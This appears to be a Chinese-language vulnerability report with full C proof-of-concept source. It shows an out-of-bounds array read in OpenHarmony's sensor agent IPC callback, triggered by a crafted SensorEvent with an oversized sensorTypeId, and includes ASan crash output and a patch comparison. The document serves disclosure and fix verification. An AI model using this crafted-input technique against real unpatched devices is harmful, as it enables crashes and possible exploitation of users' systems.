## PoC 验证

**方法**: Target-Compile — 编译真实 `sensor_agent_proxy.c` 为 `.o`，test driver 通过公共 API 入口 `RegisterSensorChannel` 注册 IPC 回调，再通过 `SAMGR_SimulatePush` 模拟服务端推送触发漏洞。

**编译产物**:
- `sensor_agent_proxy.o` — 真实源码编译（使用 `-Dstatic=` 暴露内部状态用于测试初始化）
- `ohos_stubs.o` — OHOS IPC/SAMGR/HiLog 框架桩（IpcIo 完整 Read/Write 序列化 + SAMGR mock + HiLog + SimulatePush）
- `cJSON.o` — cJSON 库桩
- `memcpy_s.o` — securec `memcpy_s` 自动桩

**触发路径**:
```
main → RegisterSensorChannel(mockProxy, 0)
     → 设置 g_objectStub.func = SensorChannelCallback
     → WriteRemoteObject 注册 IPC push callback
     → malloc 分配 g_sensorEvent
     → SAMGR_SimulatePush(&crafted_ipc)  (模拟服务端 IPC 数据推送)
       → SensorChannelCallback(0, &ipc_data, NULL, option)
         → ReadUint32(len1) → ReadBuffer(len1) → cast SensorEvent*
         → 复制 sensorTypeId=0x7FFFFFFF 到 g_sensorEvent
         → DispatchData(g_sensorEvent)
           → g_callbackNodes[0x7FFFFFFF].next → SEGV (越界读取)
```

**ASan 输出**:
```
==74132==ERROR: AddressSanitizer: SEGV on unknown address 0x6066e8c38a18
==74132==The signal is caused by a READ memory access.
    #0 in DispatchData sensor_agent_proxy.c:201
    #1 in SensorChannelCallback sensor_agent_proxy.c:233
    #2 in SAMGR_SimulatePush (IPC push callback dispatch)
    #3 in main poc.c:109
SUMMARY: AddressSanitizer: SEGV sensor_agent_proxy.c:201 in DispatchData
==74132==ABORTING
```

**Patch 验证**（before/after 对比）:
```
BEFORE: ERROR: AddressSanitizer: SEGV on unknown address 0x6066e8c38a18 in DispatchData
AFTER:  [ERROR] DispatchData failed, sensorId 2147483647 out of range [0, 30)
        exit=0, ASan not triggered ✓
```


## 附录：PoC 源码

### poc.c

```c
/*
 * Target-Compile PoC: DispatchData OOB Array Index (CWE-129)
 *
 * Trigger path:
 *   RegisterSensorChannel(mockProxy, 0)
 *     → sets g_objectStub.func = SensorChannelCallback
 *     → WriteRemoteObject registers IPC push callback
 *     → allocates g_sensorEvent via malloc
 *   SAMGR_SimulatePush(&crafted_ipc)
 *     → SensorChannelCallback(0, &ipc_data, NULL, option)
 *       → copies sensorTypeId=0x7FFFFFFF to g_sensorEvent
 *       → DispatchData(g_sensorEvent)
 *         → g_callbackNodes[0x7FFFFFFF].next → SEGV (OOB read)
 *
 * Build: Links against real sensor_agent_proxy.o + ohos_stubs.o
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include "serializer.h"
#include "ipc_skeleton.h"
#include "iproxy_client.h"
#include "sensor_agent_type.h"
#include "sensor_agent_proxy.h"
#include "samgr_lite.h"
#include "log.h"

extern SensorEvent *g_sensorEvent;
extern int32_t RegisterSensorChannel(const void *proxy, int32_t sensorId);

static int MockInvoke(struct IClientProxy *proxy, int funcId, IpcIo *request,
                      void *owner, int (*notify)(void*, int, IpcIo*))
{
    (void)proxy; (void)funcId; (void)request; (void)notify;
    if (owner) *((int32_t*)owner) = 0;
    return 0;
}
static int MockQueryInterface(void *iUnknown, int version, void **target)
{
    (void)iUnknown; (void)version; (void)target;
    return 0;
}
static int MockAddRef(void *iUnknown) { (void)iUnknown; return 1; }
static int MockRelease(void *iUnknown) { (void)iUnknown; return 0; }

int main(void)
{
    /* Phase 1: RegisterSensorChannel — public API entry point */
    g_sensorEvent = NULL;

    IClientProxy mockProxy;
    mockProxy.QueryInterface = (QueryInterface)MockQueryInterface;
    mockProxy.AddRef = (AddRef)MockAddRef;
    mockProxy.Release = (Release)MockRelease;
    mockProxy.Invoke = (int (*)(struct IClientProxy*, int, IpcIo*, void*,
                                int (*)(void*, int, IpcIo*)))MockInvoke;

    int32_t ret = RegisterSensorChannel((const void *)&mockProxy, 0);
    if (ret != 0 || g_sensorEvent == NULL) {
        fprintf(stderr, "[POC] Setup failed\n");
        return 1;
    }

    /* Phase 2: Craft malicious IPC buffer
     * Wire format: [u32 len1][SensorEvent bytes][u32 len2][sensor data bytes] */
    uint8_t ipc_buf[256];
    memset(ipc_buf, 0, sizeof(ipc_buf));
    size_t off = 0;

    uint32_t len1 = (uint32_t)sizeof(SensorEvent);
    memcpy(ipc_buf + off, &len1, sizeof(uint32_t));
    off += sizeof(uint32_t);

    SensorEvent malicious;
    memset(&malicious, 0, sizeof(malicious));
    malicious.sensorTypeId = 0x7FFFFFFF;
    memcpy(ipc_buf + off, &malicious, sizeof(SensorEvent));
    off += sizeof(SensorEvent);

    uint32_t len2 = 8;
    memcpy(ipc_buf + off, &len2, sizeof(uint32_t));
    off += sizeof(uint32_t);
    uint8_t dummy[8] = {0};
    memcpy(ipc_buf + off, dummy, sizeof(dummy));
    off += sizeof(dummy);

    IpcIo ipc_data;
    IpcIoInit(&ipc_data, ipc_buf, off, 0);

    /* Phase 3: Trigger via SAMGR_SimulatePush — IPC push simulation */
    ret = SAMGR_SimulatePush(&ipc_data);

    free(g_sensorEvent);
    g_sensorEvent = NULL;
    return 0;
}
```
